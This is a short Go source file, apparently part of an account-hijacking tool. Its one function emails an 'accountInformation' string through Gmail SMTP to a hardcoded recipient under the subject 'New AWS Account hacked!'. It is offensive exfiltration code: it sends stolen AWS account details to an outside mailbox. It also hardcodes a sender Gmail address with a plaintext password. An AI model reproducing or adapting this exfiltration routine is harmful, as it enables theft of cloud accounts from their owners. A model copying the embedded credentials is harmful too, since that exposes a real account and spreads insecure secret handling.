package main

import (
	"fmt"
	"net/smtp"
)

type smtpServer struct {
	host string
	port string
}

// serverName URI to smtp server
func (s *smtpServer) Address() string {
	return s.host + ":" + s.port
}

func sendEmail(accountInformation string) {
	// Sender data.
	from := "insightvalley20@gmail.com"
	password := "disrupicaoeca"
	// Receiver email address.
	to := []string{
		"gbi.dantas59@gmail.com",
	}
	// smtp server configuration.
	smtpServer := smtpServer{host: "smtp.gmail.com", port: "587"}
	// Message.
	message := []byte("Subject: New AWS Account hacked!\n\n" + accountInformation + "\nAss: Klyntar")
	// Authentication.
	auth := smtp.PlainAuth("", from, password, smtpServer.host)
	// Sending email.
	err := smtp.SendMail(smtpServer.Address(), auth, from, to, message)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("Email Sent!")
}
